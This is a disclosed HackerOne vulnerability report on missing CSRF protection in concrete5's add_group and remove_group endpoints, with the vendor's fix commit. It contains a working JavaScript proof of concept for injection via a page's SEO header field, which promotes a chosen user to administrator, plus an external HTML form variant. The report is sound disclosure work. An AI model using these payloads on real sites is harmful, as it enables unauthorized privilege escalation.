{"id":64184,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82NDE4NA==","url":"https://hackerone.com/reports/64184","title":"No csrf protection on index.php/ccm/system/user/add_group, index.php/ccm/system/user/remove_group","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2015-05-28T17:58:01.319Z","submitted_at":"2015-05-28T17:58:01.319Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"jmpalk","url":"/jmpalk","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":60,"url":"https://hackerone.com/concrete5","handle":"concrete5","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/060/c549a89ab4a3550cb9bfdeba1bee6d77e2019c7e_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/060/c549a89ab4a3550cb9bfdeba1bee6d77e2019c7e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"concrete5","twitter_handle":"concrete5","website":"https://www.concrete5.org","about":"A simple and powerful content management system."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2015-08-26T20:03:22.151Z","bug_reporter_agreed_on_going_public_at":"2015-07-27T20:03:11.992Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"crayons\r\n\r\nThere is no csrf protection on index.php/ccm/system/user/add_group, and index.php/ccm/system/user/remove_group. \r\n\r\n\r\n\r\nA malicious POST request can be constructed to add or remove group membership from arbitrary users, if a logged-in admin surfs to a compromised site.\r\n\r\nFor example, a registered user who has access to edit a given page (say, a blog post) could add the following javascript to the \"Extra Header Content\" section of the page's SEO module:\r\n\r\n\u003c!-- \r\n\u003cscript language=\"JavaScript\" type=\"text/javascript\"\u003e\r\n \r\n     window.onload = promoteUser();\r\n \r\n     function promoteUser() {\r\n       var XHR = new XMLHttpRequest();\r\n       var urlEncodedData = \"\";\r\n       var urlEncodedDataPairs = [];\r\n       var name;\r\n       var data = {gID:'3', uID:'8'}; //sub uID for whatever uID you want to promote\r\n \r\n       for(name in data) {\r\n         urlEncodedDataPairs.push(encodeURIComponent(name) + '=' + encodeURIComponent(data[name]));\r\n       } //end for(name in data)\r\n \r\n       urlEncodedData = urlEncodedDataPairs.join('\u0026').replace(/%20/g, '+');\r\n \r\n       XHR.addEventListener('load', function(event){\r\n         //alert boxes for testing purposes only\r\n         //alert('Yeah! Data sent and response loaded.');\r\n         });\r\n \r\n       XHR.addEventListener('error', function(event){\r\n         //alert boxes for testing purposes only\r\n         //alert('Oops. Something went wrong.');\r\n         });\r\n \r\n       XHR.open('POST', 'http://\u003c\u003csite\u003e\u003e/concrete5/index.php/ccm/system/user/add_group');\r\n// alt:  XHR.open('POST', // 'http://\u003c\u003csite\u003e\u003e/concrete5/index.php/ccm/system/user/remove_group');\r\n\r\n       XHR.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');\r\n       XHR.setRequestHeader('Content-Length', urlEncodedData.length);\r\n \r\n       XHR.send(urlEncodedData);\r\n \r\n     }//end promoteUser\r\n\u003c/script\u003e\r\n\r\n--\u003e\r\n\r\nAs an aside, I'm not sure whether allowing any user to add javascript to the \"Extra Header Content\" field of a page's SEO module counts as XSS or not, since it seems like a feature, albeit one that could be abused.","vulnerability_information_html":"\u003cp\u003ecrayons\u003c/p\u003e\n\n\u003cp\u003eThere is no csrf protection on index.php/ccm/system/user/add_group, and index.php/ccm/system/user/remove_group. \u003c/p\u003e\n\n\u003cp\u003eA malicious POST request can be constructed to add or remove group membership from arbitrary users, if a logged-in admin surfs to a compromised site.\u003c/p\u003e\n\n\u003cp\u003eFor example, a registered user who has access to edit a given page (say, a blog post) could add the following javascript to the \u0026quot;Extra Header Content\u0026quot; section of the page\u0026#39;s SEO module:\u003c/p\u003e\n\n\u003cp\u003e\u0026lt;!-- \u003cbr\u003e\n\u0026lt;script language=\u0026quot;JavaScript\u0026quot; type=\u0026quot;text/javascript\u0026quot;\u0026gt;\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e window.onload = promoteUser();\n\n function promoteUser() {\n   var XHR = new XMLHttpRequest();\n   var urlEncodedData = \u0026quot;\u0026quot;;\n   var urlEncodedDataPairs = [];\n   var name;\n   var data = {gID:\u0026#39;3\u0026#39;, uID:\u0026#39;8\u0026#39;}; //sub uID for whatever uID you want to promote\n\n   for(name in data) {\n     urlEncodedDataPairs.push(encodeURIComponent(name) + \u0026#39;=\u0026#39; + encodeURIComponent(data[name]));\n   } //end for(name in data)\n\n   urlEncodedData = urlEncodedDataPairs.join(\u0026#39;\u0026amp;\u0026#39;).replace(/%20/g, \u0026#39;+\u0026#39;);\n\n   XHR.addEventListener(\u0026#39;load\u0026#39;, function(event){\n     //alert boxes for testing purposes only\n     //alert(\u0026#39;Yeah! Data sent and response loaded.\u0026#39;);\n     });\n\n   XHR.addEventListener(\u0026#39;error\u0026#39;, function(event){\n     //alert boxes for testing purposes only\n     //alert(\u0026#39;Oops. Something went wrong.\u0026#39;);\n     });\n\n   XHR.open(\u0026#39;POST\u0026#39;, \u0026#39;http://\u0026lt;\u0026lt;site\u0026gt;\u0026gt;/concrete5/index.php/ccm/system/user/add_group\u0026#39;);\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e// alt:  XHR.open(\u0026#39;POST\u0026#39;, // \u0026#39;http://\u0026lt;\u0026lt;site\u0026gt;\u0026gt;/concrete5/index.php/ccm/system/user/remove_group\u0026#39;);\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e   XHR.setRequestHeader(\u0026#39;Content-Type\u0026#39;, \u0026#39;application/x-www-form-urlencoded\u0026#39;);\n   XHR.setRequestHeader(\u0026#39;Content-Length\u0026#39;, urlEncodedData.length);\n\n   XHR.send(urlEncodedData);\n\n }//end promoteUser\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u0026lt;/script\u0026gt;\u003c/p\u003e\n\n\u003cp\u003e--\u0026gt;\u003c/p\u003e\n\n\u003cp\u003eAs an aside, I\u0026#39;m not sure whether allowing any user to add javascript to the \u0026quot;Extra Header Content\u0026quot; field of a page\u0026#39;s SEO module counts as XSS or not, since it seems like a feature, albeit one that could be abused.\u003c/p\u003e\n","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2015-08-26T20:03:12.371Z","allow_singular_disclosure_after":-168604175.77623403,"singular_disclosure_allowed":true,"vote_count":0,"voters":[],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":431903,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I was in a hurry yesterday, and decided overnight I could clean up the report and POC. See below.\nCrayons\n\nThere is no csrf protection on index.php/ccm/system/user/add_group, and index.php/ccm/system/user/remove_group.\n\nConsequently, an attacker could craft a malicious POST request that will add or remove group membership from arbitrary users, if a logged-in admin surfs to a compromised site. This includes adding members to the administrator group, giving the attacker full control of the site.\n\nPossibly exploitable from outside the site, this can definitely be triggered from any page where the attacker has write access to the SEO information on the page.\n\nPOC\n\nAs an administrator, create a new blog page in concrete5, and give write access/edit permission to another, non-administrator, user.\n\nIn the \"Extra Header Content\" section of the page's SEO module, add the following javascript:\n\n\u003c!-- \n\u003cscript language=\"JavaScript\" type=\"text/javascript\"\u003e\n\nwindow.onload = promoteUser();\n\n function promoteUser() {\n   var XHR = new XMLHttpRequest();\n   var urlEncodedData = \"\";\n   var urlEncodedDataPairs = [];\n   var name;\n   var data = {gID:'3', uID:'8'}; //sub uID for whatever uID you want to promote\n\n   for(name in data) {\n     urlEncodedDataPairs.push(encodeURIComponent(name) + '=' + encodeURIComponent(data[name]));\n   } //end for(name in data)\n\n   urlEncodedData = urlEncodedDataPairs.join('\u0026').replace(/%20/g, '+');\n\n   XHR.addEventListener('load', function(event){\n     //alert boxes for testing purposes only\n     //alert('Yeah! Data sent and response loaded.');\n     });\n\n   XHR.addEventListener('error', function(event){\n     //alert boxes for testing purposes only\n     //alert('Oops. Something went wrong.');\n     });\n\n   XHR.open('POST', 'http://\u003c\u003csite\u003e\u003e/concrete5/index.php/ccm/system/user/add_group');\n\n   XHR.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');\n   XHR.setRequestHeader('Content-Length', urlEncodedData.length);\n\n   XHR.send(urlEncodedData);\n\n }//end promoteUser\n\n\u003c/script\u003e\n\n--\u003e\n\nAs the non administrator user, save and publish the page\n\nAs the administrator, browse to the new blog page. \n\nThe non-privileged user should now have administrator privileges the next time s/he logs in.\n\nThe same attack can be used to remove a user from a group by substituting 'remove_group' for 'add_group' in the XHR.open statement in the JS above.","markdown_message":"\u003cp\u003eI was in a hurry yesterday, and decided overnight I could clean up the report and POC. See below.\u003cbr\u003e\nCrayons\u003c/p\u003e\n\n\u003cp\u003eThere is no csrf protection on index.php/ccm/system/user/add_group, and index.php/ccm/system/user/remove_group.\u003c/p\u003e\n\n\u003cp\u003eConsequently, an attacker could craft a malicious POST request that will add or remove group membership from arbitrary users, if a logged-in admin surfs to a compromised site. This includes adding members to the administrator group, giving the attacker full control of the site.\u003c/p\u003e\n\n\u003cp\u003ePossibly exploitable from outside the site, this can definitely be triggered from any page where the attacker has write access to the SEO information on the page.\u003c/p\u003e\n\n\u003cp\u003ePOC\u003c/p\u003e\n\n\u003cp\u003eAs an administrator, create a new blog page in concrete5, and give write access/edit permission to another, non-administrator, user.\u003c/p\u003e\n\n\u003cp\u003eIn the \u0026quot;Extra Header Content\u0026quot; section of the page\u0026#39;s SEO module, add the following javascript:\u003c/p\u003e\n\n\u003cp\u003e\u0026lt;!-- \u003cbr\u003e\n\u0026lt;script language=\u0026quot;JavaScript\u0026quot; type=\u0026quot;text/javascript\u0026quot;\u0026gt;\u003c/p\u003e\n\n\u003cp\u003ewindow.onload = promoteUser();\u003c/p\u003e\n\n\u003cp\u003efunction promoteUser() {\u003cbr\u003e\n   var XHR = new XMLHttpRequest();\u003cbr\u003e\n   var urlEncodedData = \u0026quot;\u0026quot;;\u003cbr\u003e\n   var urlEncodedDataPairs = [];\u003cbr\u003e\n   var name;\u003cbr\u003e\n   var data = {gID:\u0026#39;3\u0026#39;, uID:\u0026#39;8\u0026#39;}; //sub uID for whatever uID you want to promote\u003c/p\u003e\n\n\u003cp\u003efor(name in data) {\u003cbr\u003e\n     urlEncodedDataPairs.push(encodeURIComponent(name) + \u0026#39;=\u0026#39; + encodeURIComponent(data[name]));\u003cbr\u003e\n   } //end for(name in data)\u003c/p\u003e\n\n\u003cp\u003eurlEncodedData = urlEncodedDataPairs.join(\u0026#39;\u0026amp;\u0026#39;).replace(/%20/g, \u0026#39;+\u0026#39;);\u003c/p\u003e\n\n\u003cp\u003eXHR.addEventListener(\u0026#39;load\u0026#39;, function(event){\u003cbr\u003e\n     //alert boxes for testing purposes only\u003cbr\u003e\n     //alert(\u0026#39;Yeah! Data sent and response loaded.\u0026#39;);\u003cbr\u003e\n     });\u003c/p\u003e\n\n\u003cp\u003eXHR.addEventListener(\u0026#39;error\u0026#39;, function(event){\u003cbr\u003e\n     //alert boxes for testing purposes only\u003cbr\u003e\n     //alert(\u0026#39;Oops. Something went wrong.\u0026#39;);\u003cbr\u003e\n     });\u003c/p\u003e\n\n\u003cp\u003eXHR.open(\u0026#39;POST\u0026#39;, \u0026#39;http://\u0026lt;\u0026lt;site\u0026gt;\u0026gt;/concrete5/index.php/ccm/system/user/add_group\u0026#39;);\u003c/p\u003e\n\n\u003cp\u003eXHR.setRequestHeader(\u0026#39;Content-Type\u0026#39;, \u0026#39;application/x-www-form-urlencoded\u0026#39;);\u003cbr\u003e\n   XHR.setRequestHeader(\u0026#39;Content-Length\u0026#39;, urlEncodedData.length);\u003c/p\u003e\n\n\u003cp\u003eXHR.send(urlEncodedData);\u003c/p\u003e\n\n\u003cp\u003e}//end promoteUser\u003c/p\u003e\n\n\u003cp\u003e\u0026lt;/script\u0026gt;\u003c/p\u003e\n\n\u003cp\u003e--\u0026gt;\u003c/p\u003e\n\n\u003cp\u003eAs the non administrator user, save and publish the page\u003c/p\u003e\n\n\u003cp\u003eAs the administrator, browse to the new blog page. \u003c/p\u003e\n\n\u003cp\u003eThe non-privileged user should now have administrator privileges the next time s/he logs in.\u003c/p\u003e\n\n\u003cp\u003eThe same attack can be used to remove a user from a group by substituting \u0026#39;remove_group\u0026#39; for \u0026#39;add_group\u0026#39; in the XHR.open statement in the JS above.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-05-29T12:34:58.383Z","updated_at":"2015-05-29T12:34:58.383Z","actor":{"username":"jmpalk","cleared":false,"url":"/jmpalk","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"concrete5","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":440173,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This could also be exploited via an HTML form on an external site. For example:\n\n\n\n     \u003cform action=\"http://www.jmpalktest.com/concrete5742/index.php/ccm/system/user/add_group\" method=\"post\"\u003e\n\n      \u003cinput type=\"hidden\" name=\"gID\" value=\"3\" /\u003e\n      \u003cinput type=\"hidden\" name=\"uID\" value=\"6\" /\u003e\n\n      \u003cbutton type=\"submit\"\u003eCsrf your site here!\u003c/button\u003e\n\n    \u003c/form\u003e \n","markdown_message":"\u003cp\u003eThis could also be exploited via an HTML form on an external site. For example:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e \u0026lt;form action=\u0026quot;http://www.jmpalktest.com/concrete5742/index.php/ccm/system/user/add_group\u0026quot; method=\u0026quot;post\u0026quot;\u0026gt;\n\n  \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;gID\u0026quot; value=\u0026quot;3\u0026quot; /\u0026gt;\n  \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;uID\u0026quot; value=\u0026quot;6\u0026quot; /\u0026gt;\n\n  \u0026lt;button type=\u0026quot;submit\u0026quot;\u0026gt;Csrf your site here!\u0026lt;/button\u0026gt;\n\n\u0026lt;/form\u0026gt; \n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2015-06-04T02:11:14.297Z","updated_at":"2015-06-04T02:11:14.297Z","actor":{"username":"jmpalk","cleared":false,"url":"/jmpalk","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"concrete5","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":475436,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"My apologies for this sitting, I'm looking into this now.","markdown_message":"\u003cp\u003eMy apologies for this sitting, I\u0026#39;m looking into this now.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-06-17T17:02:26.248Z","updated_at":"2015-06-17T17:02:26.248Z","actor":{"username":"korvin","cleared":false,"url":"/korvin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/yi9xvfnDmjKpKA1reqNSwGct/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"concrete5","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":475478,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"https://github.com/concrete5/concrete5/commit/303c51bfffcdcc04f01f1b8c2ee23efd925ef685","markdown_message":"\u003cp\u003e\u003ca title=\"https://github.com/concrete5/concrete5/commit/303c51bfffcdcc04f01f1b8c2ee23efd925ef685\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fconcrete5%2Fconcrete5%2Fcommit%2F303c51bfffcdcc04f01f1b8c2ee23efd925ef685\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/concrete5/concrete5/commit/303c51bfffcdcc04f01f1b8c2ee23efd925ef685\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2015-06-17T17:28:39.577Z","updated_at":"2015-06-17T17:28:39.577Z","actor":{"username":"korvin","cleared":false,"url":"/korvin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/yi9xvfnDmjKpKA1reqNSwGct/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"jmpalk","url":"/jmpalk"},"genius_execution_id":null,"team_handle":"concrete5","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":527509,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2015-07-27T20:03:12.115Z","updated_at":"2015-07-27T20:03:12.115Z","first_to_agree":true,"actor":{"username":"jmpalk","cleared":false,"url":"/jmpalk","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"concrete5","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":564660,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2015-08-26T20:03:23.252Z","updated_at":"2015-08-26T20:03:23.252Z","actor":{"url":"/concrete5","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/060/c549a89ab4a3550cb9bfdeba1bee6d77e2019c7e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"concrete5"}},"genius_execution_id":null,"team_handle":"concrete5","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":158,"category":"team","content":"`add_group` and `remove_group` have no CSRF protection.","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003e\u003ccode\u003eadd_group\u003c/code\u003e and \u003ccode\u003eremove_group\u003c/code\u003e have no CSRF protection.\u003c/p\u003e\n"},{"category":"researcher","can_view?":true,"can_create?":false}]}